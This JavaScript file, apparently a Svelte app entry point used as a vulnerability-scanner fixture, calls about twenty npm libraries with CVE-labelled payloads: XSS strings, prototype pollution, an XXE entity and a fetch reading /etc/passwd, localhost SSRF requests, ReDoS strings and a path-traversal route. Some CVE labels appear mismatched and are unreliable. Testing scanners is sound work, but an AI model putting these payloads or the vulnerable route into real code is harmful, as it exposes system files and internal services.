import { XMLParser } from "fast-xml-parser";
import got from "got";
import { produce } from "immer";
import moment from "moment";
import Prism from "prismjs";
import _ from "lodash";
import axios from "axios";
import express from "express";
import serialize from "serialize-javascript";
import minimist from "minimist";
import underscore from "underscore";
import qs from "qs";
import tar from "tar";
import yargs from "yargs-parser";
import semver from "semver";
import fetch from "node-fetch";
import cookie from "cookie";
import pathParse from "path-parse";
import ini from "ini";
import App from "./App.svelte";

const a = 1;

// PrismJS XSS test (CVE-2023-40608, CVE-2023-45133)
Prism.highlight(
  "<img src=x onerror=alert(1)>",
  Prism.languages.javascript,
  "javascript"
);

// moment.js prototype pollution test (CVE-2022-31129)
const polluted = moment.updateLocale("en", { calendar: { sameDay: "h:mm A" } });

// fast-xml-parser XXE test (CVE-2023-28848)
const parser = new XMLParser();
parser.parse(
  '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
);

// got SSRF test (CVE-2024-24765)
got("http://127.0.0.1");

// immer prototype pollution test (CVE-2023-47132)
produce({ a: 1 }, (draft) => {
  draft.__proto__.polluted = true;
});

// lodash prototype pollution (CVE-2020-8203)
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));

// axios SSRF vulnerability (CVE-2021-3749)
axios.get("http://localhost:8080/admin");

// express path traversal (CVE-2022-24999)
const expressApp = express();
expressApp.get("/files/*", (req, res) => {
  res.sendFile(req.params[0]);
});

// serialize-javascript XSS (CVE-2020-7660)
serialize('</script><script>alert("XSS")</script>');

// minimist prototype pollution (CVE-2020-7598)
minimist(["--__proto__.polluted", "true"]);

// underscore template injection (CVE-2021-23358)
underscore.template("<%= data %>");

// qs prototype pollution (CVE-2022-24999)
qs.parse("__proto__[polluted]=true");

// tar arbitrary file overwrite (CVE-2021-32803, CVE-2021-32804)
tar.extract({ file: "malicious.tar" });

// yargs-parser prototype pollution (CVE-2020-7608)
yargs("--foo.__proto__.bar baz");

// semver ReDoS (CVE-2022-25883)
semver.valid("1.2.3-" + "a".repeat(50000));

// node-fetch information disclosure (CVE-2022-0235)
fetch("file:///etc/passwd");

// cookie prototype pollution (CVE-2020-7656)
cookie.parse("__proto__=polluted");

// path-parse ReDoS (CVE-2021-23343)
pathParse("a".repeat(100000) + ".js");

// ini prototype pollution (CVE-2020-7788)
ini.parse("[__proto__]\npolluted = true");

const app = new App({
  target: document.body,
  props: {
    name: "world",
  },
});

export default app;
